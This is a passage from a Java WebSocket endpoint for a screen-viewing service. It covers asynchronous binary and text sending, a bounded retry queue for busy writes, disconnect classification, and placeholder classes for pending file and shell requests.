                  session.getAsyncRemote().sendBinary(ByteBuffer.wrap(data), result -> {
                     inFlight.set(false);
                     if (result != null && !result.isOK()) {
                        Throwable ex = result.getException();
                        Throwable root = rootCause(ex);
                        String msg = ex == null ? "unknown" : ex.getClass().getName() + ": " + safe(ex.getMessage());
                        String rootMsg = root == null ? "" : " | root=" + root.getClass().getName() + ": " + safe(root.getMessage());
                        if (!isExpectedDisconnect(ex)) {
                           System.out.println("[screen-ws] sendBinary failed " + describeSession(session) + " " + msg + rootMsg);
                        }

                        closeQuietly(session, "binary send failed");
                     }
                  });
               } catch (Exception ignored) {
                  inFlight.set(false);
                  closeQuietly(session, "binary send failed");
               }
            }
         }
      }
   }

   private void sendClientActionDenied(Session session, String requestId, String note) {
      try {
         ObjectNode payload = mapper.createObjectNode();
         payload.put("type", "clientActionResult");
         payload.put("action", "tryText");
         payload.put("status", "denied");
         payload.put("note", note == null ? "denied" : note);
         if (requestId != null && !requestId.trim().isEmpty()) {
            payload.put("requestId", requestId.trim());
         }

         sendTextSafely(session, payload.toString());
      } catch (Exception var5) {
      }
   }

   private static void closeQuietly(Session session, String reason) {
      if (session != null && session.isOpen()) {
         try {
            session.close(new CloseReason(CloseCodes.UNEXPECTED_CONDITION, reason == null ? "closed" : reason));
         } catch (Exception var3) {
         }
      }
   }

   public static boolean sendTextToSession(Session session, String message) {
      return enqueueTextSafely(session, message);
   }

   public static void clearSendState(Session session) {
      if (session != null) {
         binaryInFlight.remove(session);
         textQueues.remove(session);
         textInFlight.remove(session);
         textRetryScheduled.remove(session);
      }
   }

   private static void sendTextSafely(Session session, String message) {
      sendTextToSession(session, message);
   }

   private static boolean enqueueTextSafely(Session session, String message) {
      if (session == null || message == null || message.trim().isEmpty()) {
         return false;
      }

      if (!session.isOpen()) {
         return false;
      }

      Queue<String> queue = textQueues.computeIfAbsent(session, key -> new ConcurrentLinkedQueue<>());
      AtomicBoolean inFlight = textInFlight.computeIfAbsent(session, key -> new AtomicBoolean(false));

      while (queue.size() >= 32) {
         queue.poll();
      }

      queue.offer(message);
      drainTextQueue(session, queue, inFlight);
      return true;
   }

   private static void drainTextQueue(Session session, Queue<String> queue, AtomicBoolean inFlight) {
      if (session != null && queue != null && inFlight != null) {
         if (inFlight.compareAndSet(false, true)) {
            String payload = queue.poll();
            if (payload == null) {
               inFlight.set(false);
            } else if (!session.isOpen()) {
               queue.clear();
               inFlight.set(false);
            } else {
               try {
                  session.getAsyncRemote().sendText(payload, result -> {
                     inFlight.set(false);
                     if (result != null && !result.isOK()) {
                        Throwable ex = result.getException();
                        if (isWriteBusy(ex)) {
                           queue.offer(payload);
                           scheduleTextDrain(session, queue, inFlight);
                           return;
                        }

                        Throwable rootx = rootCause(ex);
                        String msgx = ex == null ? "unknown" : ex.getClass().getName() + ": " + safe(ex.getMessage());
                        String rootMsgx = rootx == null ? "" : " | root=" + rootx.getClass().getName() + ": " + safe(rootx.getMessage());
                        if (!isExpectedDisconnect(ex)) {
                           System.out.println("[screen-ws] sendText failed " + describeSession(session) + " " + msgx + rootMsgx);
                        }
                     }

                     if (session.isOpen() && !queue.isEmpty()) {
                        drainTextQueue(session, queue, inFlight);
                     }
                  });
               } catch (Exception ex) {
                  inFlight.set(false);
                  if (isWriteBusy(ex)) {
                     queue.offer(payload);
                     scheduleTextDrain(session, queue, inFlight);
                     return;
                  }

                  Throwable root = rootCause(ex);
                  String msg = ex.getClass().getName() + ": " + safe(ex.getMessage());
                  String rootMsg = root == null ? "" : " | root=" + root.getClass().getName() + ": " + safe(root.getMessage());
                  if (!isExpectedDisconnect(ex)) {
                     System.out.println("[screen-ws] sendText failed " + describeSession(session) + " " + msg + rootMsg);
                  }

                  if (session.isOpen() && !queue.isEmpty()) {
                     drainTextQueue(session, queue, inFlight);
                  }
               }
            }
         }
      }
   }

   private static boolean isWriteBusy(Throwable throwable) {
      Throwable current = throwable;

      for (int guard = 0; current != null && guard < 16; guard++) {
         String detail = safe(String.valueOf(current)).toUpperCase();
         if (detail.contains("BINARY_FULL_WRITING")) {
            return true;
         }

         if (detail.contains("TEXT_FULL_WRITING")) {
            return true;
         }

         String message = safe(current.getMessage()).toUpperCase();
         if (message.contains("BINARY_FULL_WRITING")) {
            return true;
         }

         if (message.contains("TEXT_FULL_WRITING")) {
            return true;
         }

         current = current.getCause();
      }

      return false;
   }

   private static void scheduleTextDrain(Session session, Queue<String> queue, AtomicBoolean inFlight) {
      if (session != null && queue != null && inFlight != null) {
         AtomicBoolean scheduled = textRetryScheduled.computeIfAbsent(session, key -> new AtomicBoolean(false));
         if (scheduled.compareAndSet(false, true)) {
            textRetryExecutor.schedule(() -> {
               scheduled.set(false);
               if (session.isOpen() && !queue.isEmpty()) {
                  drainTextQueue(session, queue, inFlight);
               }
            }, 25L, TimeUnit.MILLISECONDS);
         }
      }
   }

   private static String describeSession(Session session) {
      if (session == null) {
         return "session=null";
      }

      String id = safe(session.getId());
      String key = getViewerProp(session, "viewerKey");
      String target = getViewerProp(session, "viewerTargetId");
      boolean active = isViewerActive(session);
      boolean open = session.isOpen();
      return "id=" + id + " key=" + safe(key) + " target=" + safe(target) + " active=" + active + " open=" + open;
   }

   private static Throwable rootCause(Throwable throwable) {
      if (throwable == null) {
         return null;
      }

      Throwable current = throwable;

      for (int guard = 0; current.getCause() != null && current.getCause() != current && guard < 16; guard++) {
         current = current.getCause();
      }

      return current;
   }

   private static boolean isExpectedDisconnect(Throwable throwable) {
      Throwable root = rootCause(throwable);
      if (!(root instanceof EOFException) && !(root instanceof ClosedChannelException)) {
         String msg = root == null ? "" : safe(root.getMessage()).toLowerCase();
         return msg.contains("connection reset")
            || msg.contains("broken pipe")
            || msg.contains("forcibly closed")
            || msg.contains("socket closed")
            || msg.contains("websocket session has been closed")
            || msg.contains("websocket session is closed");
      } else {
         return true;
      }
   }

   private static String safe(String value) {
      return value == null ? "" : value.replace('\n', ' ').replace('\r', ' ').trim();
   }

   private static final class PendingFileRequest {
      private final Session session;
      private final long createdAt;

      private PendingFileRequest(Session session, long createdAt) {
         this.session = session;
         this.createdAt = createdAt;
      }
   }

   private static final class PendingShellRequest {
      private final Session session;
      private final long createdAt;

      private PendingShellRequest(Session session, long createdAt) {
         this.session = session;
         this.createdAt = createdAt;
      }
   }
}
